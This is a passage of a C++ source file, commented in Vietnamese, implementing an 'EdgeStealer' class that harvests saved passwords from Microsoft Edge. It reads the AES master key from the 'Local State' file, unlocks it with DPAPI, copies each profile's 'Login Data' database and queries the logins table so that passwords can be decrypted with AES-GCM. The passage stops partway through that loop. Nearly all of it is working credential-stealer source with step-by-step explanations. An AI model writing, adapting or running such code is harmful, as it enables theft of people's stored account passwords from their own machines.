#include "edge_stealer.h" // Header khai báo lớp EdgeStealer
#include <shlobj.h>       // Cần thiết cho hàm SHGetKnownFolderPath (lấy đường dẫn thư mục đặc biệt của Windows)
#include <fstream>        // Cần thiết cho các lớp xử lý file (std::ifstream)
#include <sstream>        // Cần thiết cho std::stringstream (thao tác chuỗi như một stream)
#include <vector>         // Cần thiết cho std::vector (mảng động)
#include <codecvt>        // Cần thiết cho std::wstring_convert (chuyển đổi giữa wstring và string) - Lưu ý: deprecated trong C++17
#include <locale>         // Cần thiết cho std::wstring_convert
#include <windows.h>      // Header chính của Windows API
#include <wincrypt.h>     // Cần thiết cho CryptoAPI (ví dụ: CryptStringToBinaryA, CryptUnprotectData)
#include <bcrypt.h>       // Cần thiết cho CNG (Cryptography API: Next Generation) (ví dụ: BCryptDecrypt cho AES-GCM)
#include "sqlite3.h"      // Header cho thư viện SQLite3 (để tương tác với database)

// Đảm bảo bạn đã có các tệp phát triển SQLite3 (sqlite3.h và sqlite3.lib) trong dự án của mình.
// Nếu chưa, hãy tải chúng từ trang web chính thức của SQLite và đặt chúng vào thư mục include và library của dự án.
// Cập nhật cài đặt dự án của bạn trong Visual Studio:
// 1. Đi tới Project -> Properties -> VC++ Directories.
// 2. Thêm thư mục chứa sqlite3.h vào "Include Directories".
// 3. Thêm thư mục chứa sqlite3.lib vào "Library Directories".

// Liên kết với các thư viện cần thiết thông qua pragma
#pragma comment(lib, "Crypt32.lib") // Thư viện cho CryptoAPI (DPAPI, Base64)
#pragma comment(lib, "Bcrypt.lib")  // Thư viện cho CNG (AES-GCM)

using namespace std; // Sử dụng namespace std để không cần gõ std:: trước các thành phần chuẩn

/*
* SƠ ĐỒ LUỒNG GIẢI MÃ MẬT KHẨU EDGE/CHROME:
*
* [File "Local State" của Edge/Chrome]
* |
* +--> Lấy trường "encrypted_key" (dưới dạng Base64)
* |
* v
* [Giải mã Base64 chuỗi "encrypted_key"] --> Ra chuỗi byte có tiền tố "DPAPI"
* |
* +--> Bỏ 5 byte tiền tố "DPAPI"
* |
* v
* [Giải mã DPAPI (CryptUnprotectData)] --> Khóa AES (Master Key - 32 byte)
*
*
* [File "Login Data" (SQLite DB) của Edge/Chrome]
* |
* +--> Sao chép sang file tạm để tránh bị lock
* |
* v
* [Mở file tạm bằng SQLite]
* |
* +--> Truy vấn bảng "logins", lấy cột "password_value" (dạng BLOB)
* |
* v
* [Kiểm tra 3 byte đầu của "password_value"]
* /                                   \
* / (Nếu là "v10" hoặc "v11")           \ (Nếu không có tiền tố)
* v                                       v
* [Giải mã AES-256-GCM]                  [Giải mã DPAPI trực tiếp]
* - IV: 12 byte (ngay sau "v10"/"v11")    - Dùng CryptUnprotectData
* - Ciphertext: Phần còn lại trừ tag
* - Tag: 16 byte cuối
* - Key: Khóa AES đã lấy từ "Local State"
* |                                       |
* +---------------------------------------+
* |
* v
* [Mật khẩu đã giải mã (Plaintext)]
*
*
* Tại sao có "v10" hoặc "v11"?
* - Từ Chrome v80 trở lên (và các trình duyệt dựa trên Chromium như Edge), Google đã chuyển sang
* sử dụng AES-256-GCM để mã hóa giá trị `password_value` trong cơ sở dữ liệu SQLite ("Login Data").
* - Để phân biệt giữa dữ liệu được mã hóa bằng phương pháp mới (AES-GCM) và phương pháp cũ (DPAPI),
* họ đã thêm tiền tố "v10" hoặc "v11" vào đầu của `password_value`.
* - Cấu trúc của `password_value` khi có tiền tố:
* `password_value = "v10" (hoặc "v11") (3 bytes) + IV (Nonce) (12 bytes) + Ciphertext (N bytes) + Authentication Tag (16 bytes)`
* - "v10" (hoặc "v11") có nghĩa là: Mật khẩu này được mã hóa bằng AES-256-GCM, và khóa AES chính (master key)
* được lưu trong file "Local State" (sau khi giải mã DPAPI).
*
* Nếu không có "v10" / "v11" thì sao?
* - Các phiên bản Chrome/Edge cũ hơn, hoặc trong một số trường hợp đặc biệt, mật khẩu có thể vẫn được
* mã hóa trực tiếp bằng DPAPI truyền thống.
* - Trong trường hợp này, `password_value` là một BLOB nhị phân không có tiền tố.
* - Windows tự quản lý khóa cho DPAPI, và việc giải mã được thực hiện bằng hàm `CryptUnprotectData()`.
*/

// Hàm chuyển đổi std::string (chuỗi byte, giả định là UTF-8) sang std::wstring (chuỗi wide char)
wstring StringToWString(const string& str) {
    if (str.empty()) return std::wstring(); // Trả về chuỗi rỗng nếu đầu vào rỗng

    // Bước 1: Tính toán kích thước buffer cần thiết cho chuỗi wstring đầu ra.
    // MultiByteToWideChar với cchWideChar = 0 sẽ trả về số lượng ký tự wide cần thiết.
    int size_needed = MultiByteToWideChar(CP_UTF8,       // Mã trang nguồn (UTF-8)
        0,             // Cờ (không có cờ đặc biệt)
        &str[0],       // Con trỏ tới chuỗi nguồn
        (int)str.size(),// Kích thước chuỗi nguồn (-1 nếu null-terminated)
        NULL,          // Buffer đích (NULL để lấy kích thước)
        0);            // Kích thước buffer đích (0 để lấy kích thước)
    if (size_needed == 0) return std::wstring(); // Lỗi nếu không tính được kích thước

    // Bước 2: Cấp phát buffer cho wstring và thực hiện chuyển đổi.
    std::wstring wstrTo(size_needed, 0); // Khởi tạo wstring với kích thước đã tính
    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
    return wstrTo;
}

// Hàm chuyển đổi std::wstring (chuỗi wide char) sang std::string (chuỗi byte, mã hóa thành UTF-8)
std::string WStringToString(const std::wstring& wstr) {
    if (wstr.empty()) return std::string(); // Trả về chuỗi rỗng nếu đầu vào rỗng

    // Bước 1: Tính toán kích thước buffer cần thiết cho chuỗi string (UTF-8) đầu ra.
    // WideCharToMultiByte với cbMultiByte = 0 sẽ trả về số byte cần thiết.
    int size_needed = WideCharToMultiByte(CP_UTF8,       // Mã trang đích (UTF-8)
        0,             // Cờ
        &wstr[0],      // Con trỏ tới chuỗi wide nguồn
        (int)wstr.size(),// Kích thước chuỗi wide nguồn
        NULL,          // Buffer đích (NULL để lấy kích thước)
        0,             // Kích thước buffer đích (0 để lấy kích thước)
        NULL,          // Ký tự mặc định nếu không chuyển được (không dùng)
        NULL);         // Con trỏ tới cờ báo hiệu ký tự mặc định đã được dùng (không dùng)
    if (size_needed == 0) return std::string(); // Lỗi nếu không tính được kích thước

    // Bước 2: Cấp phát buffer cho string và thực hiện chuyển đổi.
    std::string strTo(size_needed, 0); // Khởi tạo string với kích thước đã tính
    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}

// Hàm giải mã một chuỗi Base64 thành vector các byte.
// Sử dụng Windows CryptoAPI (CryptStringToBinaryA).
vector<BYTE> Base64Decode(const string& input) {
    vector<BYTE> result; // Vector để lưu trữ kết quả giải mã (dạng byte).
    DWORD decodedSize = 0; // Biến lưu kích thước dữ liệu sau khi giải mã.

    // Bước 1: Gọi CryptStringToBinaryA với pbBinary = NULL để lấy kích thước cần thiết cho buffer kết quả.
    // Đây là một "trick" phổ biến với nhiều hàm WinAPI xử lý buffer động.
    //  - input.c_str(): Chuỗi Base64 đầu vào.
    //  - input.length(): Độ dài của chuỗi đầu vào.
    //  - CRYPT_STRING_BASE64: Cờ chỉ định rằng chuỗi đầu vào là Base64.
    //  - NULL (cho pbBinary): Chỉ yêu cầu tính toán kích thước.
    //  - &decodedSize: Con trỏ để nhận kích thước buffer cần thiết.
    //  - NULL, NULL (cho pdwSkip, pdwFlags): Không cần các thông tin này.
    if (!CryptStringToBinaryA(input.c_str(), input.length(), CRYPT_STRING_BASE64, NULL, &decodedSize, NULL, NULL)) {
        // Nếu hàm trả về FALSE (thất bại), có thể do chuỗi input không hợp lệ.
        return result; // Trả về vector rỗng.
    }

    // Nếu thành công lấy được kích thước, thay đổi kích thước vector kết quả.
    result.resize(decodedSize);

    // Bước 2: Gọi CryptStringToBinaryA lần nữa để thực hiện giải mã thực sự.
    //  - result.data(): Con trỏ tới buffer đã cấp phát để chứa dữ liệu giải mã.
    //  - &decodedSize (lần này là in/out): Hàm sẽ ghi số byte thực sự đã giải mã vào đây.
    if (!CryptStringToBinaryA(input.c_str(), input.length(), CRYPT_STRING_BASE64, result.data(), &decodedSize, NULL, NULL)) {
        // Nếu giải mã thất bại.
        result.clear(); // Xóa nội dung vector.
    }
    return result; // Trả về vector chứa dữ liệu đã giải mã, hoặc vector rỗng nếu lỗi.
}

// Hàm giải mã dữ liệu đã được mã hóa bằng Windows DPAPI (Data Protection API).
// DPAPI cho phép ứng dụng mã hóa dữ liệu nhạy cảm, với khóa mã hóa được quản lý bởi hệ điều hành
// và thường gắn liền với thông tin đăng nhập của người dùng.
vector<BYTE> DPAPIUnprotectData(const std::vector<BYTE>& encryptedData) {
    /*
    * DATA_BLOB là một cấu trúc chuẩn của WinAPI dùng để đại diện cho một khối dữ liệu nhị phân:
    * typedef struct _CRYPTOAPI_BLOB {
    * DWORD cbData; // Kích thước của dữ liệu (tính bằng byte).
    * BYTE* pbData; // Con trỏ tới dữ liệu.
    * } DATA_BLOB;
    */
    DATA_BLOB inputBlob;  // BLOB cho dữ liệu đầu vào (đã mã hóa).
    DATA_BLOB outputBlob; // BLOB cho dữ liệu đầu ra (sau khi giải mã).
    vector<BYTE> decryptedData; // Vector để lưu trữ kết quả giải mã.

    // Chuẩn bị inputBlob từ vector encryptedData.
    // const_cast được dùng vì API yêu cầu BYTE* nhưng data() của vector const trả về const BYTE*.
    // Điều này an toàn vì CryptUnprotectData chỉ đọc từ inputBlob.pbData.
    inputBlob.pbData = const_cast<BYTE*>(encryptedData.data());
    inputBlob.cbData = static_cast<DWORD>(encryptedData.size());

    /*
    * Hàm CryptUnprotectData: Giải mã dữ liệu đã được mã hóa bởi CryptProtectData.
    * Tham số:
    * - &inputBlob: Con trỏ tới DATA_BLOB chứa dữ liệu cần giải mã.
    * - NULL (cho ppszDataDescr): Không cần trả về mô tả dữ liệu.
    * - NULL (cho pOptionalEntropy): Không có entropy bổ sung được sử dụng khi mã hóa.
    * - NULL (cho pvReserved): Tham số dự trữ, phải là NULL.
    * - NULL (cho pPromptStruct): Không hiển thị UI prompt.
    * - 0 (cho dwFlags): Không có cờ đặc biệt. Thường dùng CRYPTPROTECT_UI_FORBIDDEN để không bao giờ hiện UI.
    * - &outputBlob: Con trỏ tới DATA_BLOB để nhận dữ liệu đã giải mã.
    * Bộ nhớ cho outputBlob.pbData được cấp phát bởi hệ thống và cần được giải phóng bằng LocalFree.
    */
    if (CryptUnprotectData(&inputBlob, NULL, NULL, NULL, NULL, CRYPTPROTECT_UI_FORBIDDEN, &outputBlob)) {
        // Nếu giải mã thành công:
        // Sao chép dữ liệu từ outputBlob.pbData vào vector decryptedData.
        decryptedData.assign(outputBlob.pbData, outputBlob.pbData + outputBlob.cbData);
        // Giải phóng bộ nhớ đã được cấp phát cho outputBlob.pbData.
        LocalFree(outputBlob.pbData);
    }
    // Nếu giải mã thất bại, decryptedData sẽ rỗng.
    return decryptedData;
}

/*
* SƠ ĐỒ LUỒNG GIẢI MÃ AES-256-GCM SỬ DỤNG BCRYPT API:
*
* [Input Dữ liệu]
* - key (32 bytes): Khóa AES-256 (đã lấy từ Local State và giải mã DPAPI).
* - iv (12 bytes): Nonce / Initialization Vector (lấy từ 3 byte đầu của password_value + 12 byte tiếp theo).
* - tag (16 bytes): Authentication Tag (16 byte cuối của password_value).
* - ciphertext (N bytes): Dữ liệu đã mã hóa (phần giữa IV và Tag của password_value).
*
* |
* v
* BƯỚC 1: Mở một "provider" cho thuật toán AES.
* - Gọi BCryptOpenAlgorithmProvider(BCRYPT_AES_ALGORITHM) -> hAlg (handle thuật toán)
* |
* v
* BƯỚC 2: Thiết lập chế độ hoạt động là GCM (Galois/Counter Mode) cho provider.
* - Gọi BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, BCRYPT_CHAIN_MODE_GCM)
* |
* v
* BƯỚC 3: Tạo một đối tượng khóa đối xứng từ khóa AES (raw key bytes).
* - Gọi BCryptGenerateSymmetricKey(hAlg, key.data()) -> hKey (handle khóa)
* |
* v
* BƯỚC 4: Chuẩn bị cấu trúc BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO.
* - Khởi tạo bằng BCRYPT_INIT_AUTH_MODE_INFO.
* - Điền các thông tin: pbNonce, cbNonce, pbTag, cbTag.
* - (pbAuthData, cbAuthData nếu có dữ liệu xác thực kèm theo - AAD, thường không có trong trường hợp này).
* |
* v
* BƯỚC 5: Gọi hàm BCryptDecrypt để giải mã.
* - Lần 1: Gọi với pbOutput = NULL để lấy kích thước buffer cần thiết (decryptedLen).
* - Cấp phát buffer cho decryptedText với kích thước decryptedLen.
* - Lần 2: Gọi với pbOutput = decryptedText.data() để thực hiện giải mã thực sự.
* |
* v
* [Output: Dữ liệu đã giải mã (plaintext)]
*
* Dọn dẹp:
* - BCryptDestroyKey(hKey)
* - BCryptCloseAlgorithmProvider(hAlg, 0)
*/
// Hàm giải mã dữ liệu bằng thuật toán AES-256-GCM.
// Sử dụng Windows CNG (Cryptography API: Next Generation) qua các hàm BCrypt*.
vector<BYTE> AESGCMDecrypt(const vector<BYTE>& key, const vector<BYTE>& iv, const vector<BYTE>& tag, const vector<BYTE>& ciphertext) {
    vector<BYTE> decryptedText; // Vector để lưu trữ văn bản đã giải mã.
    NTSTATUS status = 0;        // Biến lưu trữ mã trạng thái trả về từ các hàm BCrypt.

    BCRYPT_ALG_HANDLE hAlg = NULL; // Handle cho provider thuật toán (ở đây là AES).
    BCRYPT_KEY_HANDLE hKey = NULL; // Handle cho đối tượng khóa AES đã được tạo.

    // Bước 1: Mở một provider thuật toán cho AES.
    //  - &hAlg: Con trỏ nhận về handle của provider.
    //  - BCRYPT_AES_ALGORITHM: Chuỗi định danh thuật toán AES.
    //  - NULL (cho pszImplementation): Sử dụng provider mặc định của Microsoft.
    //  - 0 (cho dwFlags): Không có cờ đặc biệt.
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    // BCRYPT_SUCCESS(status) là macro kiểm tra xem status có phải là mã thành công không (thường là status >= 0).
    if (!BCRYPT_SUCCESS(status)) {
        return decryptedText; // Trả về vector rỗng nếu lỗi.
    }

    // Bước 2: Thiết lập chế độ hoạt động của thuật toán là GCM (Galois/Counter Mode).
    //  - hAlg: Handle của provider thuật toán đã mở.
    //  - BCRYPT_CHAINING_MODE: Tên thuộc tính cần thiết lập (chế độ xâu chuỗi khối).
    //  - (PBYTE)BCRYPT_CHAIN_MODE_GCM: Giá trị của thuộc tính (chuỗi L"GCM").
    //  - sizeof(BCRYPT_CHAIN_MODE_GCM): Kích thước của giá trị thuộc tính.
    //  - 0 (cho dwFlags): Không có cờ.
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0); // Dọn dẹp provider trước khi thoát.
        return decryptedText;
    }

    // Bước 3: Tạo (nhập) một đối tượng khóa đối xứng từ chuỗi byte khóa AES thô.
    // Hàm này không "generate" khóa ngẫu nhiên mà "import" khóa đã có.
    //  - hAlg: Handle của provider thuật toán.
    //  - &hKey: Con trỏ nhận về handle của đối tượng khóa.
    //  - NULL, 0 (cho pbKeyObject, cbKeyObject): Không sử dụng bộ nhớ đệm key object riêng, để provider tự quản lý.
    //  - (PBYTE)key.data(): Con trỏ tới dữ liệu khóa AES thô (32 byte cho AES-256).
    //  - (ULONG)key.size(): Kích thước của khóa AES.
    //  - 0 (cho dwFlags): Không có cờ.
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PBYTE)key.data(), (ULONG)key.size(), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return decryptedText;
    }

    // Bước 4: Chuẩn bị cấu trúc BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO.
    // Cấu trúc này chứa các thông tin cần thiết cho chế độ mã hóa xác thực như GCM, bao gồm Nonce (IV) và Tag.
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo); // Macro này khởi tạo các trường cbSize và dwInfoVersion của struct.
    authInfo.pbNonce = (PBYTE)iv.data();      // Con trỏ tới dữ liệu IV (Nonce).
    authInfo.cbNonce = (ULONG)iv.size();      // Kích thước của IV (thường là 12 byte cho GCM).
    authInfo.pbTag = (PBYTE)tag.data();       // Con trỏ tới dữ liệu Authentication Tag.
    authInfo.cbTag = (ULONG)tag.size();       // Kích thước của Tag (thường là 16 byte cho GCM).
    // Các trường khác như pbAuthData (Associated Data), pbMacContext không cần thiết cho trường hợp giải mã mật khẩu Edge/Chrome cơ bản.

    // Bước 5: Thực hiện giải mã.
    ULONG decryptedLen = 0; // Biến lưu kích thước dữ liệu đã giải mã.

    // Lần gọi đầu tiên: Lấy kích thước bộ đệm cần thiết cho văn bản đã giải mã.
    //  - hKey: Handle của đối tượng khóa AES.
    //  - (PBYTE)ciphertext.data(): Con trỏ tới dữ liệu cần giải mã (ciphertext).
    //  - (ULONG)ciphertext.size(): Kích thước của ciphertext.
    //  - &authInfo: Con trỏ tới cấu trúc chứa thông tin GCM (IV, Tag).
    //  - NULL, 0 (cho pbIV, cbIV): IV được cung cấp qua authInfo, không cần ở đây.
    //  - NULL, 0 (cho pbOutput, cbOutput): Chỉ lấy kích thước, không ghi output.
    //  - &decryptedLen: Con trỏ nhận về kích thước buffer cần thiết.
    //  - 0 (cho dwFlags): Thường là 0. BCRYPT_BLOCK_PADDING không áp dụng cho GCM.
    status = BCryptDecrypt(hKey, (PBYTE)ciphertext.data(), (ULONG)ciphertext.size(), &authInfo, NULL, 0, NULL, 0, &decryptedLen, 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptDestroyKey(hKey); // Dọn dẹp key và provider trước khi thoát.
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return decryptedText;
    }

    // Cấp phát bộ nhớ cho vector chứa văn bản đã giải mã.
    decryptedText.resize(decryptedLen);

    // Lần gọi thứ hai: Thực hiện giải mã thực sự vào buffer đã cấp phát.
    // Các tham số tương tự như lần gọi đầu, nhưng pbOutput và cbOutput giờ đã có giá trị.
    status = BCryptDecrypt(hKey, (PBYTE)ciphertext.data(), (ULONG)ciphertext.size(), &authInfo, NULL, 0, decryptedText.data(), decryptedLen, &decryptedLen, 0);
    if (!BCRYPT_SUCCESS(status)) {
        // Lỗi giải mã, có thể do khóa sai, IV sai, tag không khớp (dữ liệu bị thay đổi hoặc hỏng).
        decryptedText.clear(); // Xóa nội dung vector nếu giải mã thất bại.
    }

    // Bước 6: Dọn dẹp tài nguyên.
    BCryptDestroyKey(hKey);                     // Hủy đối tượng khóa.
    BCryptCloseAlgorithmProvider(hAlg, 0);      // Đóng provider thuật toán.

    return decryptedText; // Trả về vector chứa dữ liệu đã giải mã, hoặc rỗng nếu có lỗi.
}

// Hàm helper để tìm tất cả các thư mục profile hợp lệ của Edge trong thư mục User Data.
// Edge có thể có nhiều profile (Default, Profile 1, Profile 2,...).
vector<wstring> GetAllEdgeProfiles(const wstring& userDataPath) {
    vector<wstring> profiles; // Vector lưu tên các profile tìm được.

    // Luôn kiểm tra profile "Default" trước.
    wstring defaultProfilePath = userDataPath + L"\\Default";
    wstring defaultLoginDataPath = defaultProfilePath + L"\\Login Data";
    // GetFileAttributesW kiểm tra sự tồn tại của file/thư mục.
    // INVALID_FILE_ATTRIBUTES được trả về nếu không tìm thấy.
    if (GetFileAttributesW(defaultProfilePath.c_str()) != INVALID_FILE_ATTRIBUTES &&
        GetFileAttributesW(defaultLoginDataPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
        profiles.push_back(L"Default");
    }

    // Tìm các profile có tên dạng "Profile X" (ví dụ: Profile 1, Profile 2,... đến Profile 5).
    // Giới hạn đến 5 profile là một phỏng đoán hợp lý, có thể tăng nếu cần.
    for (int i = 1; i <= 5; i++) {
        wstring profileName = L"Profile " + to_wstring(i);    // Tạo tên profile, ví dụ "Profile 1".
        wstring profilePath = userDataPath + L"\\" + profileName; // Đường dẫn đầy đủ đến thư mục profile.
        wstring loginDataPath = profilePath + L"\\Login Data";    // Đường dẫn đến file Login Data trong profile.

        // Kiểm tra xem thư mục profile và file Login Data bên trong có tồn tại không.
        if (GetFileAttributesW(profilePath.c_str()) != INVALID_FILE_ATTRIBUTES &&
            GetFileAttributesW(loginDataPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
            profiles.push_back(profileName); // Nếu có, thêm tên profile vào danh sách.
        }
    }
    return profiles; // Trả về danh sách các tên profile hợp lệ.
}

// --- Triển khai các phương thức của lớp EdgeStealer ---

// Constructor của lớp EdgeStealer.
EdgeStealer::EdgeStealer() {
    // Có thể thực hiện các khởi tạo cần thiết ở đây, ví dụ: nạp thư viện SQLite.
    // Hiện tại để trống.
}

// Destructor của lớp EdgeStealer.
EdgeStealer::~EdgeStealer() {
    // Giải phóng tài nguyên đã được cấp phát trong constructor hoặc trong quá trình hoạt động.
    // Hiện tại để trống.
}

// Phương thức riêng tư (private) để lấy khóa AES chính (Master Key) mà Edge/Chrome sử dụng.
// Khóa này được lưu trong file "Local State", mã hóa bằng Base64 và sau đó là DPAPI.
string EdgeStealer::GetEdgeAESKey() {
    string aesKeyStr; // Chuỗi để lưu khóa AES sau khi giải mã (dạng string).
    // Lý tưởng hơn là vector<BYTE> nhưng tuân theo header hiện tại.
    PWSTR localAppDataPath = NULL; // Con trỏ kiểu PWSTR để nhận đường dẫn từ SHGetKnownFolderPath.

    // Bước 1: Lấy đường dẫn đến thư mục %LOCALAPPDATA%.
    //  - FOLDERID_LocalAppData: Hằng số định danh thư mục Local AppData.
    //  - 0 (dwFlags): Không có cờ đặc biệt.
    //  - NULL (hToken): Lấy cho người dùng hiện tại.
    //  - &localAppDataPath: Con trỏ sẽ trỏ tới chuỗi đường dẫn được cấp phát (cần giải phóng bằng CoTaskMemFree).
    if (FAILED(SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &localAppDataPath))) {
        return aesKeyStr; // Trả về chuỗi rỗng nếu không lấy được đường dẫn.
    }

    // Chuyển đổi PWSTR sang wstring và xây dựng đường dẫn đầy đủ đến file "Local State".
    wstring localStatePathW = localAppDataPath;
    CoTaskMemFree(localAppDataPath); // Quan trọng: Giải phóng bộ nhớ đã được SHGetKnownFolderPath cấp phát.
    localStatePathW += L"\\Microsoft\\Edge\\User Data\\Local State"; // Đường dẫn cụ thể cho Edge.

    // Bước 2: Mở và đọc nội dung file "Local State". File này chứa JSON.
    ifstream localStateFile(localStatePathW); // Mở file ở chế độ đọc.
    if (!localStateFile.is_open()) {
        return aesKeyStr; // Trả về chuỗi rỗng nếu không mở được file.
    }

    // Đọc toàn bộ nội dung file vào một stringstream, sau đó vào một string.
    stringstream buffer;
    buffer << localStateFile.rdbuf(); // rdbuf() trả về con trỏ tới stream buffer của file.
    localStateFile.close(); // Đóng file.
    string localStateContent = buffer.str(); // Lấy nội dung từ stringstream.

    // Bước 3: Trích xuất giá trị của "encrypted_key" từ nội dung JSON.
    // Đây là một phương pháp parse JSON rất đơn giản và không mạnh mẽ.
    // Trong thực tế, nên sử dụng một thư viện parse JSON chuyên dụng (ví dụ: nlohmann/json).
    string encryptedKeyBase64;
    const string keyLabel = "\"encrypted_key\":\"";
    size_t keyPos = localStateContent.find(keyLabel);
    if (keyPos != string::npos) { // Nếu tìm thấy nhãn "encrypted_key":"
        keyPos += keyLabel.length(); // Di chuyển con trỏ đến sau nhãn.
        size_t endPos = localStateContent.find("\"", keyPos); // Tìm dấu ngoặc kép kết thúc giá trị.
        if (endPos != std::string::npos) {
            encryptedKeyBase64 = localStateContent.substr(keyPos, endPos - keyPos); // Trích xuất chuỗi Base64.
        }
    }

    if (encryptedKeyBase64.empty()) {
        return aesKeyStr; // Trả về rỗng nếu không tìm thấy hoặc không trích xuất được key.
    }

    // Bước 4: Giải mã chuỗi Base64 ("encrypted_key") để thu được dữ liệu nhị phân.
    vector<BYTE> encryptedKeyBytes = Base64Decode(encryptedKeyBase64);
    if (encryptedKeyBytes.empty()) {
        return aesKeyStr; // Trả về rỗng nếu giải mã Base64 thất bại.
    }

    // Bước 5: Kiểm tra và loại bỏ 5 byte tiền tố "DPAPI" khỏi dữ liệu nhị phân.
    // Khóa AES thực sự được mã hóa DPAPI nằm sau tiền tố này.
    const char dpapiPrefix[] = "DPAPI";
    const size_t prefixLength = 5;
    if (encryptedKeyBytes.size() <= prefixLength || memcmp(encryptedKeyBytes.data(), dpapiPrefix, prefixLength) != 0) {
        // Nếu không có tiền tố "DPAPI" hoặc dữ liệu quá ngắn.
        return aesKeyStr; // Đây không phải định dạng mong đợi.
    }
    // Tạo một vector mới chứa dữ liệu cần giải mã DPAPI (bỏ qua tiền tố).
    vector<BYTE> keyToUnprotect(encryptedKeyBytes.begin() + prefixLength, encryptedKeyBytes.end());

    // Bước 6: Giải mã dữ liệu (đã bỏ tiền tố) bằng Windows DPAPI.
    vector<BYTE> decryptedAesKeyBytes = DPAPIUnprotectData(keyToUnprotect);
    if (decryptedAesKeyBytes.empty()) {
        return aesKeyStr; // Trả về rỗng nếu giải mã DPAPI thất bại.
    }

    // Chuyển đổi vector<BYTE> (khóa AES đã giải mã) thành std::string để trả về.
    // Điều này giả định rằng khóa AES không chứa ký tự null ở giữa,
    // nhưng an toàn hơn là giữ nó dưới dạng vector<BYTE> nếu có thể thay đổi signature hàm.
    aesKeyStr.assign(reinterpret_cast<char*>(decryptedAesKeyBytes.data()), decryptedAesKeyBytes.size());
    return aesKeyStr; // Trả về khóa AES dưới dạng string.
}

// Phương thức chính để lấy cắp mật khẩu đã lưu trong trình duyệt Edge.
// Trả về một vector các tuple, mỗi tuple chứa (Tên Profile, URL, Tên người dùng, Mật khẩu).
vector<tuple<string, string, string, string>> EdgeStealer::StealPasswords() {
    vector<tuple<string, string, string, string>> credentials; // Vector để lưu trữ thông tin đăng nhập.

    // Bước 1: Lấy khóa AES chính của trình duyệt.
    string aesKeyStr = GetEdgeAESKey();
    if (aesKeyStr.empty()) {
        // Không lấy được khóa AES, không thể giải mã mật khẩu.
        return credentials; // Trả về vector rỗng.
    }
    // Chuyển khóa AES từ string về vector<BYTE> để sử dụng trong hàm giải mã AESGCM.
    vector<BYTE> aesKey(aesKeyStr.begin(), aesKeyStr.end());

    // Bước 2: Xác định đường dẫn đến thư mục "User Data" của Edge.
    PWSTR localAppDataPath = NULL;
    if (FAILED(SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &localAppDataPath))) {
        return credentials;
    }
    wstring userDataPathW = localAppDataPath;
    CoTaskMemFree(localAppDataPath); // Giải phóng bộ nhớ.
    userDataPathW += L"\\Microsoft\\Edge\\User Data";

    // Bước 3: Lấy danh sách tất cả các profile hợp lệ trong thư mục "User Data".
    vector<wstring> profiles = GetAllEdgeProfiles(userDataPathW);

    // Bước 4: Duyệt qua từng profile đã tìm thấy.
    for (const auto& profileW : profiles) { // profileW là tên profile dạng wstring.
        wstring loginDataPathW = userDataPathW + L"\\" + profileW + L"\\Login Data"; // Đường dẫn đến file Login Data.

        // Chuyển tên profile từ wstring sang string (UTF-8) để lưu vào kết quả.
        string profileNameA = WStringToString(profileW);

        // Kiểm tra xem file "Login Data" của profile có tồn tại không.
        if (GetFileAttributesW(loginDataPathW.c_str()) == INVALID_FILE_ATTRIBUTES) {
            continue; // Nếu không tồn tại, bỏ qua profile này.
        }

        // Bước 5: Sao chép file "Login Data" sang một file tạm thời.
        // Điều này cần thiết để tránh lỗi "database is locked" nếu Edge đang chạy và sử dụng file này.
        wstring tempLoginDataPathW = userDataPathW + L"\\" + profileW + L"\\LoginDataTemp.db"; // Tên file tạm.
        if (!CopyFileW(loginDataPathW.c_str(), tempLoginDataPathW.c_str(), FALSE)) {
            // FALSE: Ghi đè nếu file tạm đã tồn tại.
            continue; // Không sao chép được, bỏ qua profile này.
        }

        // Bước 6: Kết nối vào cơ sở dữ liệu SQLite (file tạm).
        sqlite3* db; // Con trỏ tới đối tượng database SQLite.
        // Chuyển đường dẫn file tạm từ wstring sang string (UTF-8) vì API sqlite3_open yêu cầu char*.
        string tempLoginDataPathA = WStringToString(tempLoginDataPathW);

        if (sqlite3_open(tempLoginDataPathA.c_str(), &db) != SQLITE_OK) {
            // Không mở được database.
            DeleteFileW(tempLoginDataPathW.c_str()); // Xóa file tạm.
            continue; // Bỏ qua profile này.
        }

        // Bước 7: Chuẩn bị và thực thi câu truy vấn SQL để lấy thông tin đăng nhập.
        const char* sqlQuery = "SELECT origin_url, username_value, password_value FROM logins";
        sqlite3_stmt* stmt; // Con trỏ tới đối tượng câu lệnh đã chuẩn bị (prepared statement).

        if (sqlite3_prepare_v2(db, sqlQuery, -1, &stmt, NULL) == SQLITE_OK) {
            // -1: Độ dài câu truy vấn, -1 để SQLite tự tính.
            // stmt: Nhận về con trỏ tới statement.
            // NULL (cho pzTail): Phần còn lại của câu truy vấn (nếu có nhiều câu lệnh).

            // Bước 8: Lặp qua từng dòng kết quả của câu truy vấn.
            while (sqlite3_step(stmt) == SQLITE_ROW) { // SQLITE_ROW nghĩa là có một dòng dữ liệu hợp lệ.
                // Lấy dữ liệu từ các cột.
                const char* originUrlChars = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                string originUrl = originUrlChars ? originUrlChars : ""; // Cột 0: origin_url

                const char* usernameChars = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                string username = usernameChars ? usernameChars : "";     // Cột 1: username_value

